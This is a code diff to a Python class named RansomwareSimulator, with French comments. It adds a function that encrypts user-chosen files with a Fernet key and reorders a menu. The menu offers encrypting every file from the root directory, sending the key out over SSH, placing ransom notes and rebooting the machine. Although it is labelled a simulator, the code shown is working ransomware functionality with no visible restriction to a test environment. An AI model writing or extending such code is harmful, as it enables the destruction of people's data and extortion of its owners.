@@ -121,6 +121,48 @@ class RansomwareSimulator:
             logging.warning(f"Erreur sur {filepath}: {str(e)}")
             return False
 
+    def encrypt_selected_files(self):
+        """Chiffre les fichiers sélectionnés par l'utilisateur"""
+        if not self.fernet:
+            print("\n[!] Générer d'abord une clé")
+            return
+
+        print("\n[ Sélection des fichiers à chiffrer ]")
+        print("Entrez les chemins complets des fichiers (un par ligne)")
+        print("Terminez par une ligne vide")
+
+        files_to_encrypt = []
+        while True:
+            filepath = input("> ").strip()
+            if not filepath:
+                break
+            if os.path.exists(filepath):
+                files_to_encrypt.append(filepath)
+            else:
+                print(f"[!] Fichier non trouvé: {filepath}")
+
+        if not files_to_encrypt:
+            print("\n[!] Aucun fichier valide sélectionné")
+            return
+
+        print(f"\n[!] Prêt à chiffrer {len(files_to_encrypt)} fichiers")
+        confirm = input("Confirmer (o/N): ").strip().lower()
+        if confirm != 'o':
+            print("Annulé")
+            return
+
+        total = 0
+        for filepath in files_to_encrypt:
+            try:
+                if self.encrypt_file(filepath):
+                    total += 1
+                    print(f"\r[+] Fichiers chiffrés: {total}/{len(files_to_encrypt)}", end='')
+            except Exception as e:
+                continue
+
+        logging.info(f"Chiffrement sélectif terminé: {total} fichiers")
+        print(f"\n\n[+] Terminé: {total} fichiers chiffrés")
+
     def encrypt_system(self):
         """Chiffre tous les fichiers accessibles"""
         if not self.fernet:
@@ -212,8 +254,9 @@ class RansomwareSimulator:
             print("2. Configurer le serveur SSH")
             print("3. Envoyer la clé via SSH")
             print("4. Chiffrer TOUS les fichiers (/)")
-            print("5. Placer les notes de rançon")
-            print("6. Redémarrer le système")
+            print("5. Chiffrer des fichiers sélectionnés")
+            print("6. Placer les notes de rançon")
+            print("7. Redémarrer le système")
             print("0. Quitter")
             print("="*50)
 
@@ -228,8 +271,10 @@ class RansomwareSimulator:
             elif choice == "4":
                 self.encrypt_system()
             elif choice == "5":
-                self.create_ransom_note()
+                self.encrypt_selected_files()
             elif choice == "6":
+                self.create_ransom_note()
+            elif choice == "7":
                 self.reboot_system()
             elif choice == "0":
                 print("\n[+] Fermeture du programme.")
